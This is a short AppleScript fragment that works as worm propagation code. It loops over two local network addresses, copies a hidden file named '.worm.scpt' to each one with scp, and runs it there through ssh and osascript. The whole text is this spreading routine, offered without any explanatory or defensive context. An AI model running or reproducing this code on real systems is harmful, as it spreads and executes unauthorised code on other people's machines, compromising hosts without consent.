set targets to {"192.168.0.2", "192.168.0.3"}
repeat with host in targets
	do shell script "scp ~/Library/Containers/.worm.scpt user@" & host & ":/tmp/.worm.scpt"
	do shell script "ssh user@" & host & " 'osascript /tmp/.worm.scpt'"
end repeat
